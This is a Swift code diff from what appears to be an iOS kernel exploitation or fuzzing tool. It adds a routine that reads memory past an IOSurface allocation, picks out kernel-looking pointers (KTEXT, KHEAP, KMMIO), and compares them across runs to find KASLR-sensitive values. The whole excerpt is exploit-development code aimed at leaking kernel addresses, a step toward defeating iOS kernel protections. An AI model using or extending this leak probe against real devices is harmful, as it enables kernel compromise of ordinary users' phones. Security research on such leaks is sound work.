@@ -1817,7 +1817,54 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         surface.lock(options: [], seed: &seed2)
         surface.unlock(options: [], seed: nil)
         scanAddr("post_relock", base, allocSize)
-        scanAddr("post_relock_tail", base + UInt(allocSize), 65536)
+
+        // post_relock_tail: consistently readable — use for cross-run delta
+        let prtLen = 65536
+        var prtBuf = [UInt8](repeating: 0, count: prtLen)
+        var prtOut: vm_size_t = 0
+        let prtKr: kern_return_t = prtBuf.withUnsafeMutableBytes { b in
+            vm_read_overwrite(mach_task_self_,
+                              vm_address_t(base + UInt(allocSize)),
+                              vm_size_t(prtLen),
+                              vm_address_t(bitPattern: b.baseAddress!),
+                              &prtOut)
+        }
+        if prtKr == 0 {
+            var currentVals: [UInt64] = []
+            var prtFound = 0
+            for qw in 0..<(Int(prtOut)/8) {
+                var v: UInt64 = 0
+                for b in 0..<8 { v |= UInt64(prtBuf[qw*8+b]) << (b*8) }
+                guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
+                let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
+                let cat = (v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000) ? "KTEXT" : (v < 0xFFFFFFF000000000 ? "KHEAP" : "KMMIO")
+                step("  post_relock_tail[+0x\(String(qw*8,radix:16))] = 0x\(String(v,radix:16)) [\(cat)]")
+                currentVals.append(v)
+                prtFound += 1; if prtFound >= 60 { step("  ...clipped at 60"); break }
+            }
+            step("  post_relock_tail total: \(currentVals.count) kernel vals")
+            // Delta vs previous run
+            let prev = _iosurfPrevTailValues
+            if prev.isEmpty {
+                step("DELTA: run 1 captured — tap again to see what changes")
+            } else {
+                let prevSet = Set(prev), curSet = Set(currentVals)
+                let changed = curSet.subtracting(prevSet).sorted()
+                let stable  = curSet.intersection(prevSet).sorted()
+                step("DELTA run2: stable=\(stable.count) CHANGED=\(changed.count)")
+                if !changed.isEmpty {
+                    step("  CHANGED (KASLR-sensitive):")
+                    for v in changed.prefix(15) { step("    !! 0x\(String(v,radix:16))") }
+                }
+                if !stable.isEmpty {
+                    step("  STABLE (constants):")
+                    for v in stable.prefix(5) { step("    == 0x\(String(v,radix:16))") }
+                }
+            }
+            _iosurfPrevTailValues = currentVals
+        } else {
+            step("  post_relock_tail: vm_read kr=\(prtKr)")
+        }
 
         // Scan 4: second IOSurface — allocator residue from freed pages
         let props2: [IOSurfacePropertyKey: Any] = [
